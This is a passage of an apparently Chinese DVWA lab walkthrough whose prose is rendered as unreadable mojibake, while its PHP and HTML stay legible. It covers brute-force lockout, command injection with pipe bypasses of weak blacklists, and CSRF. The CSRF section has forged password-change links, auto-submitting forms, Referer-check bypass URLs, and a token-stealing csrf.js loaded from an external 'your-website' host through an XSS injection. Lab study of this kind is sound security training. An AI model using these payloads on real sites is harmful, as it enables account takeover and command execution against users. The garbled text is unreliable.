ä¹‹åå¦‚æœè¿”å›ç»“æœä¸­å¦‚æœåªæœ‰ä¸€è¡Œæ•°æ®ä¸”ç™»é™†å¤±è´¥çš„å€¼å¤§äºæŒ‡å®šçš„ç™»å½•å¤±è´¥çš„å€¼ï¼ˆ3ï¼‰å°±è¿›å…¥ifå¾ªç¯ï¼Œæ ¹æ®æ³¨é‡Šï¼Œè¿™ä»£è¡¨ç€ç”¨æˆ·å·²ç»è¢«é”å®š // ç”¨æˆ·è¢«é”å®šã€‚æ³¨æ„ï¼Œä½¿ç”¨æ­¤æ–¹æ³•å¯èƒ½å¯¼è‡´ç”¨æˆ·æšä¸¾ï¼ // echo \"&lt;pre&gt;&lt;br /&gt;ç”±äºç™»å½•é”™è¯¯æ¬¡æ•°è¿‡å¤šï¼Œæ­¤å¸æˆ·å·²è¢«é”å®šã€‚&lt;/pre&gt;\"; // è®¡ç®—ç”¨æˆ·ä½•æ—¶å¯ä»¥å†æ¬¡ç™»å½• è¿™é‡Œè·å–æœ€åä¸€æ¬¡ç™»å½•çš„æ—¶é—´ï¼Œæ¥ç€+15*60ï¼Œä¹Ÿå°±æ˜¯ç¦ç”¨15åˆ†é’Ÿï¼Œæ¥ç€timenowè·å–å½“å‰æ—¶é—´ï¼Œå¦‚æœå½“å‰æ—¶é—´å°äºè§„å®šçš„ç¦ç”¨æ—¶é—´ï¼Œåˆ™è´¦æˆ·ä¾æ—§å¤„äºè¢«é”å®šçš„çŠ¶æ€ è¿™é‡ŒåŒä¸Šè¿°ä¸€èˆ¬ï¼Œä¹Ÿæ˜¯è¿›å…¥æ•°æ®åº“æŸ¥è¯¢ç”¨æˆ·è¾“å…¥çš„å†…å®¹æ˜¯å¦ä¸å…¶åŒ¹é… è¿™é‡Œè¯´å¦‚æœç”¨æˆ·çš„å†…å®¹åœ¨æ•°æ®åº“ä¸­å¯ä»¥æ‰¾åˆ°ï¼Œå¹¶ä¸”ç”¨æˆ·æœªå¤„äºé”å®šçŠ¶æ€ï¼Œè¯´æ˜ç”¨æˆ·æˆåŠŸç™»å½•ã€‚è¿›å…¥ifåï¼Œè·å–äº†åˆ°ç›®å‰ä¸ºæ­¢ç™»é™†å¤±è´¥çš„æ¬¡æ•°ä¸ä¸Šä¸€æ¬¡ç™»å½•çš„æ—¶é—´ã€‚ ç„¶ååˆ¤æ–­ç™»å½•æ¬¡æ•°æ˜¯å¦å¤§äºç½‘ç«™é™åˆ¶çš„ç™»å½•æ¬¡æ•°ï¼Œå¦‚æœè¶…è¿‡äº†ï¼Œåˆ™ä¼šæé†’ç”¨æˆ·åœ¨æ­¤æ¬¡ç™»å½•ä¹‹å‰ï¼Œä½ çš„è´¦å·å­˜åœ¨è¢«æš´åŠ›ç ´è§£çš„å±é™©ã€‚ ç„¶åé‡ç½®ç™»é™†å¤±è´¥çš„æ¬¡æ•°ä¸º0ï¼ˆå› ä¸ºæˆåŠŸç™»é™†äº†ï¼‰ è¿™é‡Œæ˜¯elseè¯­å¥ï¼Œå¦‚æœç”¨æˆ·æœªèƒ½æˆåŠŸç™»å½•ï¼Œåˆ™ä¼šå°†å½“å‰ç”¨æˆ·å¯¹åº”çš„ç™»é™†å¤±è´¥çš„æ¬¡æ•°+1ã€‚å…¶å®è¿™é‡Œçš„ä»£ç é€»è¾‘åº”è¯¥æ˜¯å…ˆçœ‹ä¸‹éƒ¨åˆ†åœ¨çœ‹ä¸Šéƒ¨åˆ†ã€‚ é‚£ç”±äºè¿™é‡Œå¯¹çˆ†ç ´æ¬¡æ•°åšäº†é™åˆ¶ï¼š3æ¬¡ã€‚è¿™å‡ ä¹æ–­ç»äº†æˆ‘ä»¬ç ´è§£æˆåŠŸçš„å‡ ç‡ã€‚ 0x02 Command Injection Low &lt;?php if( isset( $_POST[ 'Submit' ] ) ) { // Get input $target = $_REQUEST[ 'ip' ]; // Determine OS and execute the ping command. if( stristr( php_uname( 's' ), 'Windows NT' ) ) { // Windows $cmd = shell_exec( 'ping ' . $target ); } else { // *nix $cmd = shell_exec( 'ping -c 4 ' . $target ); } // Feedback for the end user echo \"&lt;pre&gt;{$cmd}&lt;/pre&gt;\"; } ?&gt; php_unameï¼šè¿™é‡Œé…åˆå‚æ•°sï¼Œæœ€ç»ˆä¼šè¿”å›è¿è¡Œæ¬¡PHPç¯å¢ƒçš„æ“ä½œç³»ç»Ÿä¿¡æ¯ï¼Œçœ‹æ˜¯å¦ä¸ºWindowsç³»ç»Ÿï¼Œæ ¹æ®ç³»ç»Ÿçš„ç±»åˆ«ä½¿ç”¨é€‚é…çš„pingç”¨æ³•ã€‚ è¿™é‡Œæ˜¾è€Œæ˜“è§æ²¡æœ‰å¯¹ç”¨æˆ·è¾“å…¥çš„ipå‚æ•°åšå‡ºæœ‰æ•ˆçš„è¿‡æ»¤ï¼Œè¿™æ„å‘³ç€æˆ‘ä»¬å¯ä»¥é…åˆç®¡é“ç¬¦è¿›è¡Œå‘½ä»¤æ‰§è¡Œã€‚ ç”±äºè¿™é‡Œæˆ‘æ˜¯Windowsä¸‹çš„ï¼Œæˆ‘ä»¬å…ˆç®€å•äº†è§£ä¸€ä¸‹Windowsä¸‹çš„ç®¡é“ç¬¦ç›¸å…³ç”¨æ³•ï¼š â€œ|â€å‰é¢éœ€è¦æ­£ç¡®ï¼Œç„¶åæ˜¾ç¤ºåé¢è¯­å¥çš„æ‰§è¡Œç»“æœ â€œ||â€å¦‚æœå‰é¢æ‰§è¡Œçš„è¯­å¥æ‰§è¡Œå‡ºé”™ï¼Œåˆ™æ‰§è¡Œåé¢çš„è¯­å¥ï¼Œå‰é¢çš„è¯­å¥åªèƒ½ä¸ºå‡ â€œ&amp;â€å¦‚æœå‰é¢çš„è¯­å¥ä¸ºå‡åˆ™ç›´æ¥æ‰§è¡Œåé¢çš„è¯­å¥ï¼Œå‰é¢çš„è¯­å¥ä¸ºçœŸåˆ™ä¾æ¬¡æ‰§è¡Œ â€œ&amp;&amp;â€å¦‚æœå‰é¢çš„è¯­å¥ä¸ºå‡åˆ™ç›´æ¥å‡ºé”™ï¼Œä¹Ÿä¸æ‰§è¡Œåé¢çš„è¯­å¥ï¼Œå‰é¢çš„è¯­å¥åªèƒ½ä¸ºçœŸ è¿™é‡Œæˆ‘ä»¬å¯ä»¥é…åˆ|ç®¡é“ç¬¦è¿›è¡Œå‘½ä»¤æ‰§è¡Œï¼Œå¦‚ä¸Šå›¾æ‰€ç¤ºï¼Œæˆ‘ä»¬diræˆåŠŸçœ‹åˆ°å½“å‰ç›®å½•ä¿¡æ¯ å½“ç„¶ä¹Ÿå¯ä»¥è¿›è¡Œæ–‡ä»¶è¯»å– Medium &lt;?php if( isset( $_POST[ 'Submit' ] ) ) { // Get input $target = $_REQUEST[ 'ip' ]; // Set blacklist $substitutions = array( '&amp;&amp;' =&gt; '', ';' =&gt; '', ); // Remove any of the characters in the array (blacklist). $target = str_replace( array_keys( $substitutions ), $substitutions, $target ); // Determine OS and execute the ping command. if( stristr( php_uname( 's' ), 'Windows NT' ) ) { // Windows $cmd = shell_exec( 'ping ' . $target ); } else { // *nix $cmd = shell_exec( 'ping -c 4 ' . $target ); } // Feedback for the end user echo \"&lt;pre&gt;{$cmd}&lt;/pre&gt;\"; } ?&gt; è¿™é‡Œä¸Šä¸€ä¸ªlevelæœ€å¤§çš„ä¸åŒå°±åœ¨äºï¼Œè®¾ç½®äº†é»‘åå•å¹¶ä¸”è¿‡æ»¤äº†&amp;&amp;ä¸;åˆ†å·ï¼Œä¸è¿‡è¿™å¹¶ä¸å½±å“æˆ‘ä»¬ï¼Œå› ä¸ºè¿™é‡Œè¿‡æ»¤å¹¶ä¸å…¨ï¼Œæˆ‘ä»¬ä¾æ—§å¯ä»¥å‘ä¸Šä¸€å…³ä¸€æ ·è¿›è¡Œæ–‡ä»¶è¯»å–ç­‰å‘½ä»¤æ‰§è¡Œ High &lt;?php if( isset( $_POST[ 'Submit' ] ) ) { // Get input $target = trim($_REQUEST[ 'ip' ]); // Set blacklist $substitutions = array( '&amp;' =&gt; '', ';' =&gt; '', '| ' =&gt; '', '-' =&gt; '', '$' =&gt; '', '(' =&gt; '', ')' =&gt; '', '`' =&gt; '', '||' =&gt; '', ); // Remove any of the characters in the array (blacklist). $target = str_replace( array_keys( $substitutions ), $substitutions, $target ); // Determine OS and execute the ping command. if( stristr( php_uname( 's' ), 'Windows NT' ) ) { // Windows $cmd = shell_exec( 'ping ' . $target ); } else { // *nix $cmd = shell_exec( 'ping -c 4 ' . $target ); } // Feedback for the end user echo \"&lt;pre&gt;{$cmd}&lt;/pre&gt;\"; } ?&gt; trimï¼štrim â€” å»é™¤å­—ç¬¦ä¸²é¦–å°¾å¤„çš„ç©ºç™½å­—ç¬¦ï¼ˆæˆ–è€…å…¶ä»–å­—ç¬¦ï¼‰ å¦‚ä¸Šæ‰€ç¤ºï¼Œè¿™ä¸²ä»£ç å…ˆç”¨trimå»é™¤äº†IPå‚æ•°å†…å®¹çš„ç©ºæ ¼ç­‰å­—ç¬¦ï¼Œéšåç”¨æ›´åŠ ä¸¥æ ¼çš„é»‘åå•è¿›è¡Œäº†è¿‡æ»¤ã€‚è™½ç„¶çœ‹ç€å¾ˆå…¨ï¼Œä½†ä»”ç»†è§‚å¯Ÿä¼šå‘ç°ï¼Œå…¶å¯¹|çš„è¿‡æ»¤å®é™…ä¸Šæ˜¯è¿™æ ·çš„| é™„åŠ äº†ä¸€ä¸ªç©ºæ ¼ï¼Œè¿™ä¼°è®¡æ˜¯æ¨¡æ‹Ÿç°å®ä¸­å¼€å‘äººå‘˜çš„å¤±è¯¯ã€‚è¿™æ„å‘³ç€æˆ‘ä»¬ä½¿ç”¨|ä¾æ—§å¯ä»¥å‘½ä»¤æ‰§è¡Œ Impossible &lt;?php if( isset( $_POST[ 'Submit' ] ) ) { // Check Anti-CSRF token checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' ); // Get input $target = $_REQUEST[ 'ip' ]; $target = stripslashes( $target );//å»é™¤åæ–œæ \\å­—ç¬¦ // Split the IP into 4 octects $octet = explode( \".\", $target );//å°†IPä½¿ç”¨.ç¬¦å·åˆ†éš”å¼€ // Check IF each octet is an integer //è¿™é‡Œé™åˆ¶æ­»äº†IPçš„æ¯ä¸€æ®µéƒ½éœ€è¦ä¸ºæ•´æ•°ï¼Œä¸”æ•´ä¸ªIPåªèƒ½æœ‰å››ä¸ªç½‘æ®µ if( ( is_numeric( $octet[0] ) ) &amp;&amp; ( is_numeric( $octet[1] ) ) &amp;&amp; ( is_numeric( $octet[2] ) ) &amp;&amp; ( is_numeric( $octet[3] ) ) &amp;&amp; ( sizeof( $octet ) == 4 ) ) { // If all 4 octets are int's put the IP back together. $target = $octet[0] . '.' . $octet[1] . '.' . $octet[2] . '.' . $octet[3]; // Determine OS and execute the ping command. if( stristr( php_uname( 's' ), 'Windows NT' ) ) { // Windows $cmd = shell_exec( 'ping ' . $target ); } else { // *nix $cmd = shell_exec( 'ping -c 4 ' . $target ); } // Feedback for the end user echo \"&lt;pre&gt;{$cmd}&lt;/pre&gt;\"; } else { // Ops. Let the user name theres a mistake echo '&lt;pre&gt;ERROR: You have entered an invalid IP.&lt;/pre&gt;'; } } // Generate Anti-CSRF token generateSessionToken(); ?&gt; å¦‚ä¸Šæ‰€ç¤ºï¼Œè¿™é‡Œå…ˆæ˜¯åˆ¤æ–­ç”¨æˆ·ä»¤ç‰Œï¼Œé˜²æ­¢äº†CSRFæ”»å‡»ï¼Œæ¥ç€å»é™¤äº†IPå‚æ•°çš„åæ–œæ å­—ç¬¦ï¼Œç„¶åå°†IPå†…å®¹ä»¥ç‚¹å·åˆ†éš”å¼€ï¼Œåˆ†åˆ«åˆ¤æ–­å¾—åˆ°çš„æ•°ç»„æ¯ä¸€ä½æ•°ç»„å…ƒç´ æ˜¯å¦ä¸ºæ•´æ•°ï¼Œä¸”æ•´ä¸ªæ•°ç»„é•¿åº¦åªèƒ½ä¸º4ï¼Œå¦åˆ™å°†è¢«è§†ä¸ºæ— æ•ˆIPã€‚ è¿™ç§å°±æ˜¯ç™½åå•è¿‡æ»¤çš„æ–¹å¼äº†ï¼Œåªè¦ä¸ç¬¦åˆæ­£ç¡®çš„IPæ ¼å¼ï¼Œåˆ™æŠ›å‡ºé”™è¯¯ï¼Œè¿™é‡Œæˆ‘ä»¬æ˜¯æ— æ³•ç»•è¿‡çš„ã€‚ 0x03 CSRF Low &lt;?php if( isset( $_GET[ 'Change' ] ) ) { // Get input $pass_new = $_GET[ 'password_new' ]; $pass_conf = $_GET[ 'password_conf' ]; // Do the passwords match? if( $pass_new == $pass_conf ) { // They do! $pass_new = ((isset($GLOBALS[\"___mysqli_ston\"]) &amp;&amp; is_object($GLOBALS[\"___mysqli_ston\"])) ? mysqli_real_escape_string($GLOBALS[\"___mysqli_ston\"], $pass_new ) : ((trigger_error(\"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.\", E_USER_ERROR)) ? \"\" : \"\")); $pass_new = md5( $pass_new ); // Update the database $insert = \"UPDATE `users` SET password = '$pass_new' WHERE user = '\" . dvwaCurrentUser() . \"';\"; $result = mysqli_query($GLOBALS[\"___mysqli_ston\"], $insert ) or die( '&lt;pre&gt;' . ((is_object($GLOBALS[\"___mysqli_ston\"])) ? mysqli_error($GLOBALS[\"___mysqli_ston\"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '&lt;/pre&gt;' ); // Feedback for the user echo \"&lt;pre&gt;Password Changed.&lt;/pre&gt;\"; } else { // Issue with passwords matching echo \"&lt;pre&gt;Passwords did not match.&lt;/pre&gt;\"; } ((is_null($___mysqli_res = mysqli_close($GLOBALS[\"___mysqli_ston\"]))) ? false : $___mysqli_res); } ?&gt; è¿™é‡Œç›´æ¥å¯¹ç”¨æˆ·è¾“å…¥çš„å¯†ç åˆ¤æ–­æ˜¯å¦åœ¨ä¸¤æ¬¡è¾“å…¥ä¸­ç›¸ç­‰ï¼Œå¦‚æœç›¸ç­‰ï¼Œå°±ç›´æ¥æ›´æ–°å¯†ç ï¼Œå¹¶æ²¡æœ‰å¯¹è®¿é—®æ¥æºç­‰åšå‡ºé™åˆ¶ å¾ˆæ˜æ˜¾è¿™é‡Œå¹¶ä¸èƒ½æœ‰æ•ˆçš„é˜»æ­¢CSRFçš„å­˜åœ¨ï¼Œå¦‚æœç”¨æˆ·è®¿é—®æˆ‘ä»¬ç²¾å¿ƒæ„é€ çš„æ¶æ„é“¾æ¥ï¼Œå°±ä¼šé€ æˆCSRFï¼Œé€ æˆæ¶æ„ä»£ç æ‰§è¡Œã€‚æ”»å‡»æ€è·¯å¦‚ä¸‹ï¼š http://127.0.0.1/dvwa/vulnerabilities/csrf/?password_new=123456&amp;password_conf=123456&amp;Change=Change&amp;user_token=6cfafc0462102ccd10970a2c8e8fa780# å¦‚æœç”¨æˆ·åœ¨å½“å‰ç½‘ç«™è®¿é—®ä¸Šè¿°é“¾æ¥ï¼Œé‚£å°±ä¼šæ‰§è¡Œå¯†ç ä¿®æ”¹çš„åŠŸèƒ½ã€‚å€˜è‹¥è¿™æ—¶å€™æˆ‘ä»¬çŸ¥é“äº†ç”¨æˆ·åï¼Œåˆ™æˆ‘ä»¬å¯ä»¥æˆåŠŸå†’å……ç”¨æˆ·ç™»å½•ã€‚å½“ç„¶å¦‚æœå¯¹æ–¹æœ‰ç‚¹é˜²èŒƒæ„è¯†çš„è¯ï¼Œå°±ä¸ä¼šç‚¹å‡»ä¸Šè¿°å¾ˆæ˜æ˜¾å¯ç–‘çš„ç½‘å€ï¼Œé‚£æˆ‘ä»¬å…ˆæä¸€ä¸ªç®€å•çš„çŸ­ç½‘å€æ¥æ”»å‡»ã€‚ åœ¨çº¿å·¥å…·ï¼šhttps://tool.chinaz.com/tools/dwz.aspx ç”Ÿæˆå¦‚ä¸‹ï¼šhttp://i7q.cn/5UMMrV å¯ä»¥çœ‹åˆ°æˆåŠŸä¼ªé€  é…åˆXSS è¿™ç§ XSS å’Œ CSRF ç»“åˆæˆåŠŸç‡å¾ˆé«˜ï¼Œæ”»å‡»æ›´åŠ éšè”½ã€‚é¦–å…ˆæ–°å»ºä¸€ä¸ªå¸¦æœ‰ xss æ”»å‡»è¯­å¥çš„ html é¡µé¢ï¼Œå†…å®¹å¦‚ä¸‹ï¼š &lt;html&gt; &lt;head&gt; &lt;title&gt;XSS&amp;CSRF&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;script src=\"http://127.0.0.1/dvwa/vulnerabilities/csrf/?password_new=123456&amp;password_conf=123456&amp;Change=Change&amp;user_token=6cfafc0462102ccd10970a2c8e8fa780#\"&gt;&lt;/script&gt; &lt;/body&gt; &lt;/html&gt; å½“å—å®³è€…è®¿é—®å«æœ‰è¿™ä¸ªhtmlä»£ç çš„é¡µé¢çš„æ—¶å€™ï¼Œç”¨æˆ·çš„å¯†ç å°±è¢«æ¶æ„ä¿®æ”¹äº†ã€‚ æ ¸å¿ƒè¯­å¥å°±æ˜¯é€šè¿‡ scirpt æ ‡ç­¾çš„ src å±æ€§æ¥è®°è½½æ”»å‡» payload çš„ URLã€‚å½“ç„¶è¿˜å¯ä»¥ä½¿ç”¨iframeã€imgç­‰æ ‡ç­¾ Medium &lt;?php if( isset( $_GET[ 'Change' ] ) ) { // Checks to see where the request came from if( stripos( $_SERVER[ 'HTTP_REFERER' ] ,$_SERVER[ 'SERVER_NAME' ]) !== false ) { // Get input $pass_new = $_GET[ 'password_new' ]; $pass_conf = $_GET[ 'password_conf' ]; // Do the passwords match? if( $pass_new == $pass_conf ) { // They do! $pass_new = ((isset($GLOBALS[\"___mysqli_ston\"]) &amp;&amp; is_object($GLOBALS[\"___mysqli_ston\"])) ? mysqli_real_escape_string($GLOBALS[\"___mysqli_ston\"], $pass_new ) : ((trigger_error(\"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.\", E_USER_ERROR)) ? \"\" : \"\")); $pass_new = md5( $pass_new ); // Update the database $insert = \"UPDATE `users` SET password = '$pass_new' WHERE user = '\" . dvwaCurrentUser() . \"';\"; $result = mysqli_query($GLOBALS[\"___mysqli_ston\"], $insert ) or die( '&lt;pre&gt;' . ((is_object($GLOBALS[\"___mysqli_ston\"])) ? mysqli_error($GLOBALS[\"___mysqli_ston\"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '&lt;/pre&gt;' ); // Feedback for the user echo \"&lt;pre&gt;Password Changed.&lt;/pre&gt;\"; } else { // Issue with passwords matching echo \"&lt;pre&gt;Passwords did not match.&lt;/pre&gt;\"; } } else { // Didn't come from a trusted source echo \"&lt;pre&gt;That request didn't look correct.&lt;/pre&gt;\"; } ((is_null($___mysqli_res = mysqli_close($GLOBALS[\"___mysqli_ston\"]))) ? false : $___mysqli_res); } ?&gt; å…³é”®ä»£ç å¦‚ä¸‹ if( stripos( $_SERVER[ 'HTTP_REFERER' ] ,$_SERVER[ 'SERVER_NAME' ]) !== false ) $_SERVER[ 'HTTP_REFERER' ]: è¿™æ˜¯ä¸€ä¸ª HTTP è¯·æ±‚å¤´ï¼Œå®ƒåŒ…å«äº†å½“å‰è¯·æ±‚çš„æ¥æºé¡µé¢çš„ URLã€‚ $_SERVER[ 'SERVER_NAME' ]: è¿™æ˜¯å½“å‰æœåŠ¡å™¨çš„ä¸»æœºåã€‚ è¿™é‡Œåˆ¤æ–­ç”¨æˆ·è®¿é—®è¯¥ç½‘ç«™çš„æ¥æºåœ°å€æ˜¯å¦ä¸ç½‘ç«™çš„hostç›¸åŒï¼Œå¦‚æœä¸ç›¸åŒè¿™è¯´æ˜æ¥æºæœ‰é—®é¢˜ã€‚å¦‚æœä¸€è‡´ï¼Œåˆ™è®¤ä¸ºæ˜¯çœŸæ­£çš„ç”¨æˆ·ï¼Œæ¥ç€æ›´æ–°å¯†ç ï¼ŒåŒæ—¶æ‹’ç»äº†SQLæ³¨å…¥ã€‚åŒæ—¶è¿™å…³æ”¾å¼ƒäº†tokençš„æ£€éªŒ è¿™é‡Œå°±æ˜¯è€ƒå¯Ÿæˆ‘ä»¬å¯¹äºstriposçš„ç†è§£äº†ï¼Œç”±äºè¯¥å‡½æ•°åªæ˜¯åˆ¤æ–­å¾…æŸ¥è¯¢å­—ç¬¦ä¸²æ˜¯å¦åŒ…å«æŒ‡å®šçš„å­—ç¬¦ï¼Œè¿™æ„å‘³ç€æˆ‘ä»¬é€ æ„é€ æ¶æ„ç½‘å€çš„æ—¶å€™ï¼Œåªéœ€è¦åœ¨ç½‘å€ä¸­åŒ…å«ä¸æ­£ç¡®ç½‘ç«™çš„host_nameç›¸åŒçš„éƒ¨åˆ†å³å¯ é¦–å…ˆç²¾å¿ƒæ„é€ ä¸€ä¸ªHTMLé¡µé¢ &lt;html&gt; &lt;head&gt; &lt;title&gt;CSRF&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;from method=\"get\" id=\"csrf\" action=\"http://127.0.0.1/dvwa/vulnerabilities/csrf/\"&gt; &lt;input type=\"hidden\" name=\"password_new\" value=\"123456\"&gt; &lt;input type=\"hidden\" name=\"password_conf\" value=\"123456\"&gt; &lt;input type=\"hidden\" name=\"change\" value=\"123456\"&gt; &lt;/from&gt; &lt;script&gt;document.forms['csrf'].submit();&lt;/script&gt; &lt;/body&gt; &lt;/html&gt; å½“ç”¨æˆ·è®¿é—®è¯¥é¡µé¢çš„æ—¶å€™ç”±äº&lt;script&gt;document.forms['csrf'].submit();&lt;/script&gt;çš„æ‰§è¡Œï¼Œå¯¼è‡´ç”¨æˆ·è‡ªåŠ¨æäº¤ç»™äº†ä¸Šé¢è¡¨å•å†…å®¹ï¼Œè¿›è¡Œå¯†ç çš„ä¿®æ”¹ã€‚ æ¥ä¸‹æ¥å°±æ˜¯å¯¹äºè¯¥htmlé¡µé¢ç½‘å€çš„æ„é€ äº† **ç›®å½•æ··æ·†ï¼š**å°†ä¸Šè¿° html é¡µé¢æ”¾åˆ°æœåŠ¡å™¨çš„ 127.0.0.1 ç›®å½•ä¸‹ï¼Œç„¶åè®©ç”¨æˆ·è®¿é—®è‡ªåŠ¨è§¦å‘æäº¤ç„¶åè®¿é—®æ„é€ å¥½çš„ payload åœ°å€ï¼š http://www.sqlsec.com/127.0.0.1/csrf.html **æ–‡ä»¶åæ··æ·†ï¼š**å°†ä¸Šè¿° html æ–‡ä»¶é‡å‘½åä¸º 127.0.0.1.htmlï¼Œç„¶åè®¿é—®å¦‚ä¸‹ payloadï¼š http://www.sqlsec.com/127.0.0.1.html è¿™é‡Œæœ‰å¸ˆå‚…æé†’ï¼šè¿™é‡Œæœ‰ä¸€ä¸ªå°ç»†èŠ‚ï¼Œå¦‚æœç›®æ ‡ç½‘ç«™æ˜¯ http çš„è¯ï¼Œé‚£ä¹ˆ csrf çš„è¿™ä¸ª html é¡µé¢ä¹Ÿè¦æ˜¯ http åè®®ï¼Œå¦‚æœæ˜¯ https åè®®çš„è¯ å°±ä¼šå¤±è´¥ï¼Œå…·ä½“è‡ªè¡Œæµ‹è¯•ã€‚ ï¼Ÿæ‹¼æ¥æ··æ·†refererï¼š http://www.sqlsec.com/csrf.html?127.0.0.1 å› ä¸ºï¼Ÿåé»˜è®¤å½“åšå‚æ•°ä¼ é€’ï¼Œè¿™é‡Œå› ä¸º html é¡µé¢æ˜¯ä¸èƒ½æ¥å—å‚æ•°çš„ï¼Œæ‰€ä»¥éšä¾¿è¾“å…¥æ˜¯ä¸å½±å“å®é™…çš„ç»“æœçš„ï¼Œåˆ©ç”¨è¿™ä¸ªç‰¹ç‚¹æ¥ç»•è¿‡ referer çš„æ£€æµ‹ã€‚ High if ($_SERVER['REQUEST_METHOD'] == \"POST\" &amp;&amp; array_key_exists (\"CONTENT_TYPE\", $_SERVER) &amp;&amp; $_SERVER['CONTENT_TYPE'] == \"application/json\") { $data = json_decode(file_get_contents('php://input'), true); $request_type = \"json\"; if (array_key_exists(\"HTTP_USER_TOKEN\", $_SERVER) &amp;&amp; array_key_exists(\"password_new\", $data) &amp;&amp; array_key_exists(\"password_conf\", $data) &amp;&amp; array_key_exists(\"Change\", $data)) { $token = $_SERVER['HTTP_USER_TOKEN']; $pass_new = $data[\"password_new\"]; $pass_conf = $data[\"password_conf\"]; $change = true; } } else { if (array_key_exists(\"user_token\", $_REQUEST) &amp;&amp; array_key_exists(\"password_new\", $_REQUEST) &amp;&amp; array_key_exists(\"password_conf\", $_REQUEST) &amp;&amp; array_key_exists(\"Change\", $_REQUEST)) { $token = $_REQUEST[\"user_token\"]; $pass_new = $_REQUEST[\"password_new\"]; $pass_conf = $_REQUEST[\"password_conf\"]; $change = true; } } è¿™ä¸²ä»£ç ä¸»è¦æ˜¯åˆ¤æ–­ç”¨æˆ·ä¼ å…¥çš„æ•°æ®æ˜¯å¦ä¸ºjsonç±»å‹ï¼Œå¦‚æœæ˜¯çš„è¯ï¼Œè¿›è¡Œjsonè§£å¯†ä¼ ç»™dataï¼Œæ¥ç€åˆ¤æ–­æ˜¯å¦å­˜åœ¨å››ä¸ªæŒ‡å®šçš„å˜é‡ï¼Œå¦‚æœå­˜åœ¨ï¼Œåˆ™å„è‡ªèµ‹å€¼ã€‚å¦‚æœä¸æ˜¯jsonæ•°æ®ç±»å‹ï¼Œåˆ™ä»ç„¶åˆ¤æ–­æ˜¯å¦å­˜åœ¨è¿™å››ä¸ªå˜é‡ï¼Œå¦‚æœå­˜åœ¨åˆ™åˆ†åˆ«èµ‹å€¼ if ($change) { // Check Anti-CSRF token checkToken( $token, $_SESSION[ 'session_token' ], 'index.php' ); // Do the passwords match? if( $pass_new == $pass_conf ) { // They do! $pass_new = mysqli_real_escape_string ($GLOBALS[\"___mysqli_ston\"], $pass_new); $pass_new = md5( $pass_new ); // Update the database $insert = \"UPDATE `users` SET password = '\" . $pass_new . \"' WHERE user = '\" . dvwaCurrentUser() . \"';\"; $result = mysqli_query($GLOBALS[\"___mysqli_ston\"], $insert ); // Feedback for the user $return_message = \"Password Changed.\"; } else { // Issue with passwords matching $return_message = \"Passwords did not match.\"; } mysqli_close($GLOBALS[\"___mysqli_ston\"]); if ($request_type == \"json\") { generateSessionToken(); header (\"Content-Type: application/json\"); print json_encode (array(\"Message\" =&gt;$return_message)); exit; } else { echo \"&lt;pre&gt;\" . $return_message . \"&lt;/pre&gt;\"; } } // Generate Anti-CSRF token generateSessionToken(); ?&gt; è¿™é‡Œæ˜¾ç¤ºæ£€æŸ¥äº†ç”¨æˆ·tokenæ˜¯å¦ä¸sessionåŒ¹é…ï¼Œç„¶ååˆ¤æ–­ä¸¤æ¬¡å¯†ç è¾“å…¥æ˜¯å¦ä¸€è‡´ï¼Œå¦‚æœä¸€è‡´åˆ™ç›´æ¥è¿›è¡Œå¯†ç çš„æ›´æ–°ï¼ŒåŒæ—¶é˜²æ­¢äº†SQLæ³¨å…¥çš„å¯èƒ½ã€‚ å¾ˆæ˜æ˜¾è¿™é‡Œå¹¶ä¸èƒ½æœ‰æ•ˆçš„é˜»æ­¢CSRFçš„å­˜åœ¨ï¼Œåªè¦æˆ‘ä»¬æƒ³åŠæ³•å¯ä»¥è·å–åˆ°ç”¨æˆ·çš„tokenå³å¯æˆåŠŸæ”»å‡»ã€‚ JSå‘èµ·HTTP CSRFè¯·æ±‚ æ–°å»ºä¸€ä¸ªcsrf.jsæ–‡ä»¶ï¼š // é¦–å…ˆè®¿é—®è¿™ä¸ªé¡µé¢ æ¥è·å– token var tokenUrl = 'http://127.0.0.1/dvwa/vulnerabilities/csrf/'; if(window.XMLHttpRequest) { xmlhttp = new XMLHttpRequest(); }else{ xmlhttp = new ActiveXObject(\"Microsoft.XMLHTTP\"); } var count = 0; xmlhttp.withCredentials = true; xmlhttp.onreadystatechange=function(){ if(xmlhttp.readyState ==4 &amp;&amp; xmlhttp.status==200) { // ä½¿ç”¨æ­£åˆ™æå– token var text = xmlhttp.responseText; var regex = /user_token\\' value\\=\\'(.*?)\\' \\/\\&gt;/; var match = text.match(regex); var token = match[1]; // å‘èµ· CSRF è¯·æ±‚ å°† token å¸¦å…¥ var new_url = 'http://127.0.0.1/dvwa/vulnerabilities/csrf/?user_token='+token+'&amp;password_new=123456&amp;password_conf=123456&amp;Change=Change'; if(count==0){ count++; xmlhttp.open(\"GET\",new_url,false); xmlhttp.send(); } } }; xmlhttp.open(\"GET\",tokenUrl,false); xmlhttp.send(); å°†è¿™ä¸ª csrf.js ä¸Šä¼ åˆ°å¤–ç½‘çš„æœåŠ¡å™¨ä¸Šï¼Œhttp://your-website/csrf.jsï¼Œéšåè®¿é—®dvwaçš„xss highçº§åˆ«ï¼Œæ’å…¥æ¶æ„jsä»£ç  http://127.0.0.1/dvwa/vulnerabilities/xss_d/?default=English&amp;a=&lt;/option&gt;&lt;/select&gt;&lt;script src=\"http://your-website/csrf.js\"&gt;&lt;/script&gt; è¿™é‡Œç›´æ¥é€šè¿‡ script æ ‡ç­¾çš„ src æ¥å¼•å…¥å¤–éƒ¨ jsï¼Œè®¿é—®ä¹‹åæ­¤æ—¶å¯†ç å°±è¢«æ›´æ”¹ä¸º 123456 äº† å¦å¤–è¿™é‡Œå­¦ä¹ äº†å›½å…‰å¸ˆå‚…çš„å¦ä¸€ç§æ€è·¯ï¼š å¸¸è§„ HTML å‘èµ· CSRF è¯·æ±‚ å‡è®¾æ”»å‡»è€…è¿™é‡Œå¯ä»¥å°† HTML ä¿å­˜ä¸Šä¼ åˆ° CORS çš„è·¨åŸŸç™½åå•ä¸‹çš„è¯ï¼Œé‚£ä¹ˆè¿™é‡Œä¹Ÿå¯ä»¥é€šè¿‡ HTML è¿™ç§ç»„åˆå¼çš„ CSRF 